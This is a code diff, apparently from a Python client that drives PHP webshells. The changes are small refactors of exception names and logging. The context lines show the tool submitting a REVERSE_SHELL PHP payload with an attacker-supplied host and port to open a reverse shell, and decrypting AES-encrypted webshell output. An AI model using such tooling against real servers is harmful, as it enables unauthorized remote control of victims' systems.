@@ -1128,7 +1128,7 @@ class PHPWebshellActions(PHPSessionInterface):
         code = format_phpcode(REVERSE_SHELL, host=string_repr(host), port=str(port))
         result = await self.submit(code)
         if result == "WRONG_NO_METHOD":
-            raise TargetError("目标打开反弹shell对应的函数")
+            raise exceptions.TargetError("目标打开反弹shell对应的函数")
 
     async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
         json_result = await self.submit(GET_BASIC_INFO_PHP)
@@ -1324,8 +1324,7 @@ class PHPWebshellCommunication(PHPWebshellActions):
                 result = decrypt_aes256_cbc(self.aes_key, result_enc).decode("utf-8")
                 return result
             except Exception as exc:
-                import traceback
-                traceback.print_exc()
+                logger.error("Decryption failed", exc_info=True)
                 raise exceptions.PayloadOutputError("解密失败") from exc
 
         return wrap
